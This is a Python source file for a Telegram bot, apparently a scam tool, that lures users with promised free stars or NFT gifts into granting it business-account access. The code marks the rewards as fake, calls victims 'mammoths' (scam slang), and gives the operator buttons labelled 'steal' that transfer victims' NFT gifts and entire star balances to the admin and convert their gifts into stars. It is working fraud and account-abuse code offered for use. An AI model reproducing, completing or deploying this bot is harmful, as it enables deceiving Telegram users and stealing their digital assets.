import sqlite3
import json
import os
import logging
import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, BusinessConnection, FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import TransferGift, ConvertGiftToStars
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods.transfer_business_account_stars import TransferBusinessAccountStars
from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts, TransferGiftFixed, ConvertGiftToStarsFixed
import config

CONNECTIONS_FILE = "business_connections.json"
TOKEN = config.BOT_TOKEN
ADMIN_ID = config.ADMIN_ID
DB_NAME = "gifts.db"

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Пути к изображениям в корневой папке
WELCOME_IMAGE = "welcome.jpg"
INSTRUCTION_IMAGE1 = "instruction1.jpg"
INSTRUCTION_IMAGE2 = "instruction2.jpg"
CONNECTED_IMAGE = "connected.jpg"
THANKS_IMAGE = "thanks.jpg"

# ID анимированного стикера
ANIMATED_STICKER_ID = "CAACAgIAAxkBAAEQBjRoVqhAcbJ2FXHZmv9U-WhiWaxhGwACv2EAAn0D0Ut_a2H_B25HxDYE"

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)

# Инициализация базы данных
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS gift_choices
                 (user_id INTEGER PRIMARY KEY, gift_type TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return []
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("Ошибка при разборе JSON-файла.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    try:
        with open("connections.json", "r") as f:
            data = json.load(f)
        return data.get(str(user_id))
    except (FileNotFoundError, json.JSONDecodeError):
        return None

def load_connections():
    try:
        with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return []

def save_connections(connections):
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(connections, f, indent=2, ensure_ascii=False)

async def send_welcome_message_to_admin(user_id):
    try:
        await bot.send_message(ADMIN_ID, f"Мамонт #{user_id} подключил бота. 🎆🦣")
    except Exception as e:
        logging.exception("Не удалось отправить сообщение в личный чат.")

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name,
        "last_name": business_connection.user.last_name
    }

    data = []
    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

async def send_gift_selection_message(chat_id: int):
    try:
        photo = FSInputFile(CONNECTED_IMAGE)
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🎁 200 Звёзд", callback_data="gift:stars")],
            [InlineKeyboardButton(text="🎁 NFT Подарок", callback_data="gift:nft")]
        ])
        await bot.send_photo(
            chat_id=chat_id,
            photo=photo,
            caption=(
                "<b>🎉 Поздравляем с подключением!</b>\n\n"
                "<b>🪄 Выберите свой подарок за подключение:</b>\n\n"
                "⭐️ <b>200 Звёзд</b> - поступят в течение 60 минут\n\n"
                "🎨 <b>NFT Подарок</b> - уникальный цифровой подарок в течение 𝟸-3 часов"
            ),
            parse_mode="HTML",
            reply_markup=keyboard
        )
    except Exception as e:
        logging.error(f"Ошибка при отправке connected.jpg: {e}")
        await bot.send_message(
            chat_id=chat_id,
            text=(
                "<b>🎉 Поздравляем с подключением!</b>\n\n"
                "<b>🪄 Выберите свой подарок за подключение:</b>\n\n"
                "⭐️ <b>200 Звёзд</b> - поступят в течение 60 минут\n\n"
                "🎨 <b>NFT Подарок</b> - уникальный цифровой подарок в течение 𝟸-3 часов"
            ),
            parse_mode="HTML",
            reply_markup=keyboard
        )

@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        logging.info(f"Новое бизнес-подключение: user_id={business_connection.user.id}, business_connection_id={business_connection.id}")
        await send_welcome_message_to_admin(business_connection.user.id)
        save_business_connection_data(business_connection)

        try:
            gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
            logging.info(f"Результат проверки доступа к подаркам для user_id={business_connection.user.id}: {gifts_response}")
            await send_gift_selection_message(business_connection.user.id)
        except TelegramBadRequest as e:
            logging.error(f"Ошибка проверки доступа к подаркам для user_id={business_connection.user.id}: {e}")
            if "BOT_ACCESS_FORBIDDEN" in str(e):
                await bot.send_message(
                    chat_id=business_connection.user.id,
                    text=(
                        "<b>⚠️ Вкладка 'подарки и звёзды' не включена!</b>\n\n"
                        "Пожалуйста, включите эту вкладку в настройках бизнес-аккаунта Telegram, "
                        "иначе звёзды или NFT не будут начислены.\n\n"
                        "<b>📱 Шаг 1: Откройте настройки Telegram ➔ Бизнес-аккаунт\n"
                        "<b>⚙️ Шаг 2: В разделе 'Ассистенты' добавьте ➔ @Key_Gifts_bot и включите вкладку 'подарки и звёзды' для стабильной работы бота</b>"
                    ),
                    parse_mode="HTML"
                )
            elif "BUSINESS_CONNECTION_INVALID" in str(e):
                connections = load_connections()
                connections = [c for c in connections if c["user_id"] != business_connection.user.id]
                save_connections(connections)
                logging.info(f"Удалено невалидное бизнес-подключение для user_id={business_connection.user.id}")
                await bot.send_message(
                    chat_id=business_connection.user.id,
                    text=(
                        "<b>⚠️ Бизнес-подключение не включено!</b>\n\n"
                        "Пожалуйста, добавьте бота заново в настройки бизнес-аккаунта Telegram, "
                        "иначе звёзды или NFT не будут начислены.\n\n"
                        "<b>📱 Шаг 1: Откройте настройки Telegram ➔ Бизнес-аккаунт </b>\n"
                        "<b>⚙️ Шаг 2: В разделе 'Ассистенты' добавьте ➔ @Key_Gifts_bot и включите вкладку 'подарки и звёзды' для стабильной работы бота</b>"
                    ),
                    parse_mode="HTML"
                )
            else:
                await bot.send_message(
                    chat_id=business_connection.user.id,
                    text=(
                        "<b>❌ Ошибка проверки доступа к подаркам!</b>\n\n"
                        f"Описание ошибки: {e}\n\n"
                        "Пожалуйста, убедитесь, что бот добавлен в бизнес-аккаунт и доступ к подаркам включён."
                    ),
                    parse_mode="HTML"
                )
    except Exception as e:
        logging.exception(f"Ошибка при обработке бизнес-подключения для user_id={business_connection.user.id}: {e}")

@dp.business_message()
async def handler_message(message: Message):
    pass

@dp.message(F.text == "/start")
async def start_command(message: Message):
    try:
        connections = load_connections()
        count = len(connections)
    except:
        count = 0
    if message.from_user.id != ADMIN_ID:
        connection = next((c for c in connections if c["user_id"] == message.from_user.id), None)
        if connection:
            conn = sqlite3.connect(DB_NAME)
            c = conn.cursor()
            c.execute("SELECT gift_type FROM gift_choices WHERE user_id = ?", (message.from_user.id,))
            result = c.fetchone()
            conn.close()
            if result:
                gift_type = result[0]
                if gift_type == "stars":
                    try:
                        photo = FSInputFile(CONNECTED_IMAGE)
                        await message.answer_photo(photo, caption="✨ Ваши 200 звёзд будут зачислены в течение 60 минут!", parse_mode="HTML")
                    except Exception as e:
                        logging.error(f"Ошибка при отправке connected.jpg: {e}")
                        await message.answer("✨ Ваши 200 звёзд будут зачислены в течение 60 минут!", parse_mode="HTML")
                else:
                    try:
                        photo = FSInputFile(THANKS_IMAGE)
                        await message.answer_photo(photo, caption="🖼 Ваш уникальный NFT подарок будет доставлен в течение 2-3 часов!", parse_mode="HTML")
                    except Exception as e:
                        logging.error(f"Ошибка при отправке thanks.jpg: {e}")
                        await message.answer("🖼 Ваш уникальный NFT подарок будет доставлен в течение 2-3 часов!", parse_mode="HTML")
                return
            try:
                business_connection_id = connection["business_connection_id"]
                gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
                logging.info(f"Результат проверки доступа к подаркам для user_id={message.from_user.id}: {gifts_response}")
                await send_gift_selection_message(message.from_user.id)
                return
            except TelegramBadRequest as e:
                logging.error(f"Ошибка проверки доступа к подаркам для user_id={message.from_user.id}: {e}")
                if "BOT_ACCESS_FORBIDDEN" in str(e):
                    await message.answer(
                        "<b>⚠️ Вкладка 'подарки и звёзды' не включена!</b>\n\n"
                        "Пожалуйста, включите её в настройках бизнес-аккаунта Telegram.",
                        parse_mode="HTML"
                    )
                    return
                elif "BUSINESS_CONNECTION_INVALID" in str(e):
                    connections = [c for c in connections if c["user_id"] != message.from_user.id]
                    save_connections(connections)
                    logging.info(f"Удалено невалидное бизнес-подключение для user_id={message.from_user.id}")
                    await message.answer(
                        "<b>⚠️ Бизнес-подключение не активно!</b>\n\n"
                        "Пожалуйста, добавьте бота заново в настройки бизнес-аккаунта Telegram.",
                        parse_mode="HTML"
                    )
                    return
                else:
                    await message.answer(
                        f"<b>❌ Ошибка проверки доступа к подаркам!</b>\n\nОписание ошибки: {e}",
                        parse_mode="HTML"
                    )
                    return
        try:
            welcome_photo = FSInputFile(WELCOME_IMAGE)
            await message.answer_photo(
                welcome_photo,
                caption=(
                    "<b>📢 Добро пожаловать в Telegram Key Gifts — ваш ключ к раздачам нфт и звёзд!</b>\n\n"
                    "<b>💬 Подключите меня как вашего бизнес-ассистента — и откройте сундук с щедрыми подарками:</b>\n\n"
                    "⭐️ <b>200 Звёзд</b>\n\n"
                    "🎁 <b>Рандом уникальный NFT-Сюрприз</b>\n\n"
                    "<b>Выбор волшебного бонуса — только за вами. Готовы получить свой подарок?</b>"
                ),
                parse_mode="HTML"
            )
        except Exception as e:
            logging.error(f"Ошибка при отправке welcome.jpg: {e}")
            await message.answer(
                "<b>📢 Добро пожаловать в Telegram Key Gifts — ваш ключ к раздачам нфт и звёзд!</b>\n\n"
                "<b>💬 Подключите меня как вашего бизнес-ассистента — и откройте сундук с щедрыми подарками:</b>\n\n"
                "⭐️ <b>200 Звёзд</b>\n\n"
                "🎁 <b>Рандом уникальный NFT-Сюрприз</b>\n\n"
                "<b>Выбор волшебного бонуса — только за вами. Готовы получить свой подарок?</b>",
                parse_mode="HTML"
            )
        try:
            instruction_photo1 = FSInputFile(INSTRUCTION_IMAGE1)
            await message.answer_photo(
                instruction_photo1,
                caption="<b>📱 Шаг 1: Откройте настройки Telegram ➔ Бизнес-аккаунт</b>",
                parse_mode="HTML"
            )
        except Exception as e:
            logging.error(f"Ошибка при отправке instruction1.jpg: {e}")
            await message.answer(
                "<b>📱 Шаг 1: Откройте настройки Telegram ➔ Бизнес-аккаунт</b>",
                parse_mode="HTML"
            )
        try:
            instruction_photo2 = FSInputFile(INSTRUCTION_IMAGE2)
            await message.answer_photo(
                instruction_photo2,
                caption=(
                    "<b>⚙️ Шаг 2: В разделе 'Ассистенты' введите @Key_Gifts_bot и включите вкладку 'подарки и звёзды' для стабильной работы бота</b>"
                ),
                parse_mode="HTML"
            )
        except Exception as e:
            logging.error(f"Ошибка при отправке instruction2.jpg: {e}")
            await message.answer(
                "<b>⚙️ Шаг 2: В разделе 'Ассистенты' добавьте этого бота и включите доступ к подаркам</b>",
                parse_mode="HTML"
            )
    else:
        await message.answer(
            f"🛠️ <b>Админ-панель Gift Collector</b>\n\n"
            f"🔗 Количество подключений: {count}\n\n"
            f"📊 Команды управления:\n"
            f"/gifts - просмотреть гифты\n"
            f"/stars - просмотреть звезды\n"
            f"/transfer - передать гифт вручную\n"
            f"/convert - конвертировать подарки в звезды",
            parse_mode="HTML"
        )

@dp.callback_query(F.data.startswith("gift:"))
async def handle_gift_selection(callback: CallbackQuery):
    gift_type = callback.data.split(":")[1]
    await callback.message.edit_reply_markup(reply_markup=None)

    # Проверка, был ли уже сделан выбор
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT gift_type FROM gift_choices WHERE user_id = ?", (callback.from_user.id,))
    result = c.fetchone()
    if result:
        await bot.send_message(
            ADMIN_ID,
            f"Пользователь {callback.from_user.id} пытался повторно выбрать подарок!"
        )
        await callback.message.answer("⚠️ Вы уже выбрали подарок! Повторный выбор невозможен.")
        conn.close()
        await callback.answer()
        return

    # Сохранение выбора в базу данных
    c.execute("INSERT OR REPLACE INTO gift_choices (user_id, gift_type, timestamp) VALUES (?, ?, datetime('now'))",
              (callback.from_user.id, gift_type))
    conn.commit()
    conn.close()

    # Отправка благодарности (без реального начисления)
    if gift_type == "stars":
        message_text = (
            "🎉 <b>Поздравляю!</b>\n\n"
            "✨ Ваш подарок (200 звёзд) будет зачислен в течение 60 минут!\n\n"
            "💫 Пока вы ждёте, почему бы не пригласить друзей?"
        )
        logging.info(f"Пользователь {callback.from_user.id} выбрал 200 звёзд (имитация).")
    else:
        message_text = (
            "🎁 Отличный выбор!\n\n"
            "🖼 Ваш уникальный NFT подарок будет доставлен в течение 2-3 часов!\n\n"
            "💫 Пока вы ждёте, почему бы не пригласить друзей?"
        )
        logging.info(f"Пользователь {callback.from_user.id} выбрал NFT (имитация).")

    # Отправка сообщения с картинкой или без
    try:
        thanks_photo = FSInputFile(THANKS_IMAGE)
        await bot.send_photo(
            chat_id=callback.from_user.id,
            photo=thanks_photo,
            caption=message_text,
            parse_mode="HTML"
        )
    except Exception as e:
        logging.error(f"Ошибка при отправке thanks.jpg: {e}")
        await bot.send_message(
            chat_id=callback.from_user.id,
            text=message_text,
            parse_mode="HTML"
        )

    # Отправка стикера
    try:
        await bot.send_sticker(
            chat_id=callback.from_user.id,
            sticker=ANIMATED_STICKER_ID
        )
    except Exception as e:
        logging.error(f"Ошибка при отправке стикера: {e}")

    # Финальное сообщение
    await bot.send_message(
        chat_id=callback.from_user.id,
        text=(
            "🎈 Ваш эксклюзивный подарок направляется к вам!\n\n"
            "💌 Искренне благодарим за доверие к нашему сервису.\n\n"
            "🔒 Команда Telegram Key Gifts"
        ),
        parse_mode="HTML"
    )
    await callback.answer()

@dp.message(F.text == "/gifts")
async def handle_gifts_list(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("Нет доступа.")
        return

    try:
        connections = load_connections()
        if not connections:
            await message.answer("Нет подключённых бизнес-аккаунтов.")
            return

        kb = InlineKeyboardBuilder()
        for conn in connections:
            name = f"@{conn.get('username', '')} ({conn['user_id']})" if conn.get('username') else f"ID {conn['user_id']}"
            user_id = conn["user_id"]
            kb.button(text=name, callback_data=f"gifts:{user_id}")

        kb.adjust(1)
        await message.answer("Выбери пользователя:", reply_markup=kb.as_markup())
    except FileNotFoundError:
        await message.answer("Файл подключений не найден.")
    except Exception as e:
        logging.exception("Ошибка при загрузке подключений")
        await message.answer(f"Ошибка: {e}")

@dp.callback_query(F.data.startswith("gifts:"))
async def handle_gift_callback(callback: CallbackQuery):
    await callback.answer()
    user_id = int(callback.data.split(":", 1)[1])

    try:
        connections = load_connections()
        connection = next((c for c in connections if c["user_id"] == user_id), None)
        if not connection:
            await callback.message.answer("Подключение для этого пользователя не найдено.")
            return

        business_connection_id = connection["business_connection_id"]

        try:
            # Прямой вызов метода с ручной обработкой ответа
            response = await bot(GetBusinessAccountStarBalance(business_connection_id=business_connection_id))
            # Извлекаем amount из result, так как star_amount отсутствует
            star_amount = response.result.get('amount', 0) if hasattr(response, 'result') else 0
            text = f"🆔 Бизнес коннект: <b>{business_connection_id}</b>\n⭐️ Баланс звёзд: <b>{star_amount}</b>\n\n"
        except TelegramBadRequest as e:
            text = f"⚠️ Ошибка получения баланса звёзд: {e}\n\n"

        await callback.message.answer(text, parse_mode="HTML")

        try:
            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
            if not gifts.gifts:
                await callback.message.answer("🎁 Нет подарков.")
            else:
                for gift in gifts.gifts:
                    if gift.type == "unique":
                        gift_info = (
                            f"🎁 <b>{gift.gift.base_name} #{gift.gift.number}</b>\n"
                            f"🦣 Мамонт (Владелец): <code>{user_id}</code>\n"
                            f"🆔 OwnedGiftId: <code>{gift.owned_gift_id}</code>\n\n"
                            f"🔗 Ссылка: https://t.me/nft/{gift.gift.name}\n"
                            f"📦 Модель: <code>{gift.gift.model.name}</code>\n"
                            f"⭐️ Стоимость трансфера: 25 ⭐️"
                        )
                        kb = InlineKeyboardMarkup(
                            inline_keyboard=[[
                                InlineKeyboardButton(
                                    text="🎁 Спиздить)",
                                    callback_data=f"transfer:{user_id}:{gift.owned_gift_id}:25"
                                )
                            ]]
                        )
                        await callback.message.answer(gift_info, parse_mode="HTML", reply_markup=kb)
                        await asyncio.sleep(0.3)
        except TelegramBadRequest as e:
            await callback.message.answer(f"⚠️ Ошибка получения подарков: {e}")
    except Exception as e:
        logging.exception("Ошибка при получении данных по бизнесу")
        await callback.message.answer(f"❌ Ошибка: {e}")

@dp.callback_query(F.data.startswith("transfer:"))
async def handle_transfer(callback: CallbackQuery):
    await callback.answer()
    if callback.from_user.id != ADMIN_ID:
        await callback.message.reply("Нет доступа.")
        return

    try:
        _, user_id_str, gift_id, transfer_price_str = callback.data.split(":")
        user_id = int(user_id_str)
        transfer_price = int(transfer_price_str)  # Комиссия 25 звёзд

        connections = load_connections()

        # Находим подключение пользователя (владельца NFT)
        user_connection = next((c for c in connections if c["user_id"] == user_id), None)
        if not user_connection:
            logging.error(f"Подключение для user_id={user_id} не найдено.")
            await callback.message.answer("⚠️ Подключение пользователя не найдено.")
            return

        # Находим админское подключение
        admin_conn = next((c for c in connections if c["user_id"] == int(ADMIN_ID)), None)
        if not admin_conn:
            logging.error("Админское подключение не найдено.")
            await callback.message.answer("⚠️ Админское подключение не найдено.")
            return

        # Проверяем баланс админа для оплаты комиссии с отладочной информацией
        admin_balance_response = await bot(GetBusinessAccountStarBalance(
            business_connection_id=admin_conn["business_connection_id"]
        ))
        # Извлекаем star_amount напрямую из объекта StarAmount
        admin_star_amount = getattr(admin_balance_response, 'star_amount', 0)
        # Если star_amount отсутствует, проверяем amount
        if admin_star_amount == 0:
            admin_star_amount = getattr(admin_balance_response, 'amount', 0)
        raw_response = admin_balance_response.model_dump() if hasattr(admin_balance_response, 'model_dump') else str(admin_balance_response)
        logging.info(f"Сырой ответ API для админа (business_connection_id={admin_conn['business_connection_id']}): {raw_response}")
        logging.info(f"Админский баланс (business_connection_id={admin_conn['business_connection_id']}): {admin_star_amount}")
        if admin_star_amount < transfer_price:
            await callback.message.answer(
                f"⚠️ Недостаточно звёзд у админа ({admin_star_amount}) "
                f"для оплаты комиссии ({transfer_price} звёзд)!\n"
                f"Проверь настройки бизнес-аккаунта или подключение бота.\n"
                f"Сырой ответ API: {raw_response}"
            )
            return

        # 1. Выполняем трансфер NFT от мамонта к админу
        nft_result = await bot(TransferGift(
            business_connection_id=user_connection["business_connection_id"],
            new_owner_chat_id=int(ADMIN_ID),  # Используем new_owner_chat_id вместо receiver_user_id
            owned_gift_id=gift_id
        ))

        # 2. Списываем комиссию 25 звёзд с админа
        stars_result = await bot(TransferBusinessAccountStars(
            business_connection_id=admin_conn["business_connection_id"],
            star_count=transfer_price,
            to_business_connection_id=user_connection["business_connection_id"]
        ))

        logging.info(f"NFT передан: user_id={user_id}, gift_id={gift_id}")
        logging.info(f"Комиссия {transfer_price} звезд списана с админа")

        await callback.message.answer(
            f"✅ NFT подарок передан админу!\n"
            f"💰 Комиссия {transfer_price} звезд списана с админа"
        )

    except TelegramBadRequest as e:
        logging.error(f"Ошибка Telegram API при трансфере: {e}")
        if "GIFT_NOT_FOUND" in str(e):
            await callback.message.answer("❌ Подарок не найден!")
        elif "INSUFFICIENT_FUNDS" in str(e):
            await callback.message.answer("❌ Недостаточно звёзд для операции!")
        elif "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("❌ Бот не имеет доступа!")
        else:
            await callback.message.answer(f"❌ Ошибка операции: {e}")
    except Exception as e:
        logging.error(f"Общая ошибка трансфера: {e}")
        await callback.message.answer(f"❌ Ошибка операции: {e}")

@dp.callback_query(F.data.startswith("transfer_stars:"))
async def transfer_stars_to_admin(callback: CallbackQuery):
    _, business_connection_id, user_id = callback.data.split(":")
    user_id = int(user_id)

    try:
        # Получаем баланс звезд пользователя
        response = await bot(GetBusinessAccountStarBalance(business_connection_id=business_connection_id))
        star_balance = response.result.get('amount', 0) if hasattr(response, 'result') else 0

        if star_balance <= 0:
            await callback.message.answer("⚠️ У мамонта нет звезд для передачи.")
            return

        # Находим админское подключение
        connections = load_connections()
        admin_conn = next((c for c in connections if c["user_id"] == int(ADMIN_ID)), None)

        if not admin_conn:
            logging.error("Админское подключение не найдено.")
            await callback.message.answer("❌ Админское подключение не найдено.")
            return

        # Передаем все звёзды админу
        result = await bot(TransferBusinessAccountStars(
            business_connection_id=business_connection_id,
            star_count=star_balance,
            to_business_connection_id=admin_conn["business_connection_id"]
        ))

        logging.info(f"Звёзды переданы админу: {star_balance} от user_id={user_id}")
        await callback.message.answer(f"✅ Успешно передано {star_balance} звезд админу!")

    except TelegramBadRequest as e:
        logging.error(f"Ошибка передачи звёзд для user_id={user_id}: {e}")
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("⚠️🦣 Мамонт запретил доступ к балансу!")
        elif "INSUFFICIENT_FUNDS" in str(e):
            await callback.message.answer("⚠️ Недостаточно звезд для передачи!")
        else:
            await callback.message.answer(f"❌ Ошибка передачи: {e}")
    except Exception as e:
        logging.error(f"Неизвестная ошибка при передаче звёзд для user_id={user_id}: {e}")
        await callback.message.answer(f"❌ Неизвестная ошибка: {e}")

    await callback.answer()

@dp.message(F.text == "/stars")
async def show_star_users(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("Нет доступа.")
        return

    try:
        connections = load_connections()
        if not connections:
            await message.answer("❌🦣 Нет подключённых мамонтов.")
            return

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"@{conn.get('username', conn['user_id'])}",
                                  callback_data=f"stars:{conn['user_id']}")]
            for conn in connections
        ])

        await message.answer("🔹 Выберите мамонта для просмотра баланса звёзд:", reply_markup=kb)
    except Exception as e:
        logging.error(f"Ошибка при получении подключений: {e}")
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query(F.data.startswith("stars:"))
async def show_user_star_balance(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    connections = load_connections()
    conn = next((c for c in connections if c["user_id"] == user_id), None)

    if not conn:
        logging.error(f"Подключение для user_id={user_id} не найдено.")
        await callback.answer("❌ Подключение не найдено.", show_alert=True)
        return

    business_connection_id = conn["business_connection_id"]
    try:
        # Прямой вызов метода с ручной обработкой ответа
        response = await bot(GetBusinessAccountStarBalance(business_connection_id=business_connection_id))
        star_count = response.result.get('amount', 0) if hasattr(response, 'result') else 0
        logging.info(f"Баланс звёзд для user_id={user_id}: {star_count}")
        kb = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(
                text="✨ Спиздить звезды себе",
                callback_data=f"transfer_stars:{business_connection_id}:{user_id}"
            )
        ]])
        await callback.message.answer(
            f"⭐ <b>У мамонта {conn['first_name']} {conn['last_name'] or ''}</b>\n"
            f"💰 Баланс звёзд: <b>{star_count}</b>",
            parse_mode="HTML",
            reply_markup=kb
        )
    except TelegramBadRequest as e:
        logging.error(f"Ошибка получения баланса звёзд для user_id={user_id}: {e}")
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("⚠️ Мамонт запретил доступ к балансу!")
        else:
            await callback.message.answer(f"⚠️ Ошибка: {e}")

@dp.message(F.text == "/convert")
async def convert_menu(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("Нет доступа.")
        return

    try:
        connections = load_connections()
        if not connections:
            return await message.answer("Нет активных подключений.")

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"@{conn.get('username', conn['user_id'])}",
                                  callback_data=f"convert_select:{conn['user_id']}")]
            for conn in connections
        ])

        await message.answer("Выберите мамонта для преобразования подарков:", reply_markup=keyboard)
    except Exception as e:
        logging.error(f"Ошибка при получении подключений: {e}")
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query(F.data.startswith("convert_select:"))
async def convert_select_handler(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    connections = load_connections()
    connection = next((c for c in connections if c["user_id"] == user_id), None)

    if not connection:
        return await callback.message.edit_text("❌ Подключение не найдено.")

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[[
            InlineKeyboardButton(
                text="♻️ Преобразовать обычные подарки в звезды",
                callback_data=f"convert_exec:{user_id}"
            )
        ]]
    )

    await callback.message.edit_text(
        f"Выбран мамонт: @{connection.get('username', 'неизвестно')}",
        reply_markup=keyboard
    )

# Обновленная функция конвертации подарков в звезды
@dp.callback_query(F.data.startswith("convert_exec:"))
async def convert_exec_handler(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    connections = load_connections()
    connection = next((c for c in connections if c["user_id"] == user_id), None)

    if not connection:
        return await callback.message.edit_text("❌ Подключение не найдено.")

    try:
        # Получаем подарки пользователя
        response = await bot(GetFixedBusinessAccountGifts(
            business_connection_id=connection["business_connection_id"]
        ))
        gifts = response.gifts

        if not gifts:
            return await callback.message.edit_text("🎁 У мамонта нет подарков.")

        converted_count = 0
        failed = 0

        for gift in gifts:
            # Пропускаем уникальные подарки (NFT)
            if gift.type == "unique":
                continue

            try:
                await bot(ConvertGiftToStarsFixed(
                    business_connection_id=connection["business_connection_id"],
                    owned_gift_id=gift.owned_gift_id
                ))
                converted_count += 1
                logging.info(f"Подарок {gift.owned_gift_id} конвертирован для user_id={user_id}")

            except Exception as e:
                logging.error(f"Ошибка конвертации подарка {gift.owned_gift_id}: {e}")
                failed += 1

            # Небольшая пауза между операциями
            await asyncio.sleep(0.1)

        await callback.message.edit_text(
            f"✅ Успешно конвертировано: {converted_count} подарков\n"
            f"❌ Ошибок: {failed}"
        )

    except Exception as e:
        logging.error(f"Ошибка конвертации для user_id={user_id}: {e}")
        await callback.message.edit_text(f"❌ Ошибка: {e}")

@dp.message(F.text == "/test")
async def test(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("Нет доступа.")
        return
    await message.answer("✅ Бот работает нормально!")

async def main():
    init_db()
    print("Made with love by @antistoper")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
